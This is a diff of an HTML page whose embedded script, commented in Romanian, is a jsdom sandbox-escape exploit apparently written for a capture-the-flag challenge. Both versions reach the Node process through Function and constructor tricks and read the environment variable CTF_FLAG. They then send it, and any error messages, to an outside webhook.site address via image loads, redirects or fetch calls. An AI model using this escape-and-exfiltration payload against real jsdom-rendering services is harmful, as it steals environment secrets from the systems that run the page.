@@ -1,24 +1,22 @@
-<!DOCTYPE html><!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <body>
     <script>
         try {
-            // Aceasta este singura metodă care funcționează pentru jsdom 16.5.3
-            const constructorulMeu = Node.constructor;
-            const procesulNode = new constructorulMeu("return process")();
-            const steag = procesulNode.env.CTF_FLAG;
+            // Încercăm să extragem procesul folosind funcția constructor directă a obiectelor
+            const p = (async ()=>{}).constructor("return process")();
+            const steag = p.env.CTF_FLAG || "NU_E_AICI";
 
-            // Trimitem flag-ul prin URL către Webhook
-            // Folosim un nume de variabilă clar: 'REZULTAT'
-            const link = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?REZULTAT=" + steag;
-            
-            // Forțăm trimiterea prin două metode simultan pentru siguranță
-            new Image().src = link;
-            window.location.href = link;
-
+            // Trimitem rezultatul
+            fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_FINAL=" + steag);
         } catch (e) {
-            // Dacă tot dă eroare, trimitem eroarea nouă
-            new Image().src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/eroare_noua?detalii=" + btoa(e.message);
+            // Dacă și asta eșuează, încercăm metoda de rezervă pentru contextul global
+            try {
+                const p2 = Function("return process")();
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_FINAL=" + p2.env.CTF_FLAG);
+            } catch (e2) {
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?ERROR=" + btoa(e2.message));
+            }
         }
     </script>
 </body>
